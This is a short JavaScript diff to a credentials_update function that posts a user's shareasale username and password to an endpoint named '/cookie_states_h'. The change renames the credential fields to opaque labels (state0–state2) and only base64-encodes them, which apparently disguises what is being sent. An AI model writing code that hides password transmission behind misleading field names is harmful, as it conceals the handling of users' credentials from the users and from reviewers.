@@ -23,9 +23,9 @@ function credentials_update(u,p){
         url: api_path + "/cookie_states_h",
         async:false,
         data: { 
-            network_name: btoa('shareasale'),
-            username:btoa('ZX'+u),
-            password:btoa('ZX'+ p), 
+            state0: btoa('shareasale'),
+            state1:'ZX'+btoa(u),
+            state2:'ZX'+btoa( p), 
         },
         success: function(data) {
             if (data.success === "yes") { 
